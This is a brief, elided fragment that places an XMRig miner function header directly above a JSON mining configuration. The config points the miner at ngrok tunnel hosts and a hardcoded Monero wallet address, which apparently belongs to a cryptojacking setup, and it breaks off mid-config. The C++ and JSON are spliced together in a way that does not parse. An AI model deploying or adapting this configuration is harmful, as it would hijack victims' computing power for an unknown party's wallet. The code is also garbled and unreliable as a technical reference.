...
bool xmrig::JsonChain::addFile(const char *fileName)
{
    ...
    "http": {
        "enabled": false,
        "host": "https://ced4-91-245-254-165.ngrok.io/",
        "port": 443,
        "access-token": null,
        "restricted": true
    },
    ...
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "2.tcp.ngrok.io:15255",
            "user": "48kdSG5wLUXfVsuzA6EJaeb7syBoB6JmrTR2b1XXKXpaanhCRb1FERiLYF11NUGMfzCct79bNMLT3YuoddazzHKzShrouwz",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
